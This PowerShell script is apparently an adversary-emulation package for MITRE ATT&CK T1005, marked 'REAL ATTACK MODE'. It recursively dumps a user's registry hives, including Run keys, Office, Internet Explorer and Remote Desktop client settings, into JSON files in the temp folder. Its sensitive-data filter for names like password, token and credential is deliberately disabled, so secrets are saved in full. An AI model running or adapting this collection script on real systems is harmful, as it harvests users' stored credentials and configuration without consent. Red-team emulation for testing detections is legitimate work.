# T1005.002a - Data from Local System: User Registry Keys
# MITRE ATT&CK Enterprise - Collection Tactic
# ATOMIC ACTION: Extract user registry keys ONLY
# Platform: Windows | Privilege: User | Type: Atomic Package

param()

function Get-Configuration {
    return @{
        # REAL ATTACK MODE - Hardcoded variables for real attack
        "OUTPUT_BASE" = "$env:TEMP\mitre_results"
        "TIMEOUT" = 30

        # T1005.002a - REAL ATTACK MODE - Complete extraction without filters
        T1005_002A_REGISTRY_PATHS = @(
            "HKCU:\Software",
            "HKCU:\Environment",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            "HKCU:\Software\Microsoft\Internet Explorer",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer",
            "HKCU:\Software\Microsoft\Office",
            "HKCU:\Software\Microsoft\Terminal Server Client"
        )
        T1005_002A_INCLUDE_VALUES = $true
        T1005_002A_MAX_DEPTH = 10
        T1005_002A_FILTER_SENSITIVE = $false
        T1005_002A_MAX_VALUE_SIZE = 10485760
        T1005_002A_EXPORT_FORMAT = "json"
        T1005_002A_OUTPUT_MODE = "debug"
        T1005_002A_SILENT_MODE = $false
        T1005_002A_STEALTH_MODE = $false
    }
}

function Invoke-MicroTechniqueAction {
    param([hashtable]$Config)
    
    # ATOMIC ACTION: User registry keys extraction ONLY
    if (-not $Config.T1005_002A_SILENT_MODE) {
        Write-Host "[INFO] Starting atomic user registry keys extraction..." -ForegroundColor Yellow
    }
    
    $registryResults = @{
        "action" =  "user_registry_keys_extraction"
        "technique_id" =  "T1005.002a"
        "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        "hostname" = $env:COMPUTERNAME
        "username" = $env:USERNAME
        "privilege_level" =  "user"
    }
    
    $extractedKeys = @()
    $totalKeys = 0
    $totalValues = 0
    
    try {
        $outputDir = Join-Path $Config.OUTPUT_BASE "t1005.002a-user_registry"
        if (-not (Test-Path $outputDir)) {
            New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
        }
        
        foreach ($registryPath in $Config.T1005_002A_REGISTRY_PATHS) {
            if (-not $Config.T1005_002A_SILENT_MODE) {
                Write-Host "[INFO] Processing user registry path: $registryPath" -ForegroundColor Cyan
            }
            
            try {
                if (Test-Path $registryPath) {
                    $keyInfo = @{
                        "registry_path" = $registryPath
                        "exists" = $true
                        "extraction_time" = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                        "subkeys" = @()
                        "values" = @()
                        "error" = $null
                    }
                    
                    # Get subkeys with depth limit
                    $subkeys = Get-ChildItem -Path $registryPath -Recurse:($Config.T1005_002A_MAX_DEPTH -gt 1) -ErrorAction SilentlyContinue | Select-Object -First 1000
                    
                    foreach ($subkey in $subkeys) {
                        $keyInfo.subkeys += @{
                            "name" = $subkey.PSChildName
                            "full_path" = $subkey.PSPath
                            "subkey_count" = $subkey.SubKeyCount
                            "value_count" = $subkey.ValueCount
                            "last_write_time" = if ($subkey.LastWriteTime) { $subkey.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") } else { $null }
                        }
                        $totalKeys++
                    }
                    
                    # Extract values if requested
                    if ($Config.T1005_002A_INCLUDE_VALUES) {
                        try {
                            $regValues = Get-ItemProperty -Path $registryPath -ErrorAction SilentlyContinue
                            
                            if ($regValues) {
                                $regValues.PSObject.Properties | ForEach-Object {
                                    if ($_.Name -notmatch "^PS.*") {
                                        $valueSize = if ($_.Value) { [System.Text.Encoding]::UTF8.GetByteCount($_.Value.ToString()) } else { 0 }
                                        
                                        if ($valueSize -le $Config.T1005_002A_MAX_VALUE_SIZE) {
                                            $valueEntry = @{
                                                "name" = $_.Name
                                                "type" = $_.TypeNameOfValue
                                                "size_bytes" = $valueSize
                                            }
                                            
                                            # Filter sensitive data
                                            $sensitivePatterns = @("password", "pwd", "secret", "key", "token", "credential")
                                            $isSensitive = $false
                                            
                                            foreach ($pattern in $sensitivePatterns) {
                                                if ($_.Name -like "*$pattern*") {
                                                    $isSensitive = $true
                                                    break
                                                }
                                            }
                                            
                                            if (-not $Config.T1005_002A_FILTER_SENSITIVE -or -not $isSensitive) {
                                                $valueEntry.data = $_.Value
                                            } else {
                                                $valueEntry.data = "[FILTERED_SENSITIVE]"
                                                $valueEntry.filtered = $true
                                            }
                                            
                                            $keyInfo.values += $valueEntry
                                            $totalValues++
                                        }
                                    }
                                }
                            }
                        } catch {
                            $keyInfo.values_error = $_.Exception.Message
                        }
                    }
                    
                    # Export to file
                    $safePathName = ($registryPath -replace "HKCU:\\", "HKCU_" -replace "\\", "_")
                    $exportFileName = "$safePathName.$($Config.T1005_002A_EXPORT_FORMAT)"
                    $exportPath = Join-Path $outputDir $exportFileName
                    
                    switch ($Config.T1005_002A_EXPORT_FORMAT) {
                        "json" {
                            $keyInfo | ConvertTo-Json -Depth 10 | Out-File -FilePath $exportPath -Encoding UTF8
                            $keyInfo.export_file = $exportPath
                            $keyInfo.export_success = $true
                        }
                        "reg" {
                            try {
                                $regPath = $registryPath -replace "HKCU:\\", "HKEY_CURRENT_USER\"
                                $null = & reg export $regPath $exportPath /y 2>$null
                                $keyInfo.export_file = $exportPath
                                $keyInfo.export_success = Test-Path $exportPath
                            } catch {
                                $keyInfo.export_error = $_.Exception.Message
                                $keyInfo.export_success = $false
                            }
                        }
                    }
                } else {
                    $keyInfo = @{
                        "registry_path" = $registryPath
                        "exists" = $false
                        "error" =  "Registry path does not exist or is not accessible"
                    }
                }
                
                $extractedKeys += $keyInfo
                
            } catch {
                $extractedKeys += @{
                    "registry_path" = $registryPath
                    "exists" = $false
                    "error" = $_.Exception.Message
                }
            }
        }
        
        $registryResults.results = @{
            "status" =  "success"
            "total_registry_paths" = $Config.T1005_002A_REGISTRY_PATHS.Count
            "total_keys_extracted" = $totalKeys
            "total_values_extracted" = $totalValues
            "output_directory" = $outputDir
            "export_format" = $Config.T1005_002A_EXPORT_FORMAT
            "extracted_keys" = $extractedKeys
        }
        
        if (-not $Config.T1005_002A_SILENT_MODE) {
            Write-Host "[SUCCESS] User registry extraction completed: $totalKeys keys, $totalValues values" -ForegroundColor Green
        }
    }
    catch {
        $registryResults.results = @{
            "status" =  "error"
            "error" = $_.Exception.Message
            "total_keys_extracted" = $totalKeys
            "total_values_extracted" = $totalValues
        }
        
        if (-not $Config.T1005_002A_SILENT_MODE) {
            Write-Error "User registry extraction failed: $($_.Exception.Message)"
        }
    }
    
    return $registryResults
}

function Write-StandardizedOutput {
    param([hashtable]$Data, [hashtable]$Config)
    
    $outputDir = Join-Path $Config.OUTPUT_BASE "t1005.002a-user_registry"
    if (-not (Test-Path $outputDir)) {
        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    }
    
    switch ($Config.T1005_002A_OUTPUT_MODE) {
        "simple" {
            if ($Data.results.status -eq "success") {
                $simpleOutput = "User registry extracted: $($Data.results.total_keys_extracted) keys, $($Data.results.total_values_extracted) values"
            } else {
                $simpleOutput = "User registry extraction failed: $($Data.results.error)"
            }
            
            if (-not $Config.T1005_002A_SILENT_MODE) {
                Write-Output $simpleOutput
            }
            
            $simpleOutput | Out-File -FilePath (Join-Path $outputDir "user_registry_simple.txt") -Encoding UTF8
        }
        
        "stealth" {
            $jsonFile = Join-Path $outputDir "user_registry_keys.json"
            $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
        }
        
        "debug" {
            $jsonFile = Join-Path $outputDir "user_registry_keys.json"
            $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
            
            if (-not $Config.T1005_002A_SILENT_MODE) {
                Write-Host "[DEBUG] User registry data written to: $jsonFile" -ForegroundColor Cyan
            }
        }
    }
    
    return $outputDir
}

function Main {
    try {
        $Config = Get-Configuration
        $results = Invoke-MicroTechniqueAction -Config $config
        $outputPath = Write-StandardizedOutput -Data $results -Config $config
        
        if (-not $Config.T1005_002A_SILENT_MODE) {
            Write-Host "[COMPLETE] T1005.002a atomic execution finished - Output: $outputPath" -ForegroundColor Green
        }
        
        return 0
    }
    catch {
        if (-not $Config.T1005_002A_SILENT_MODE) {
            Write-Error "T1005.002a execution failed: $($_.Exception.Message)"
        }
        return 1
    }
}

exit (Main)


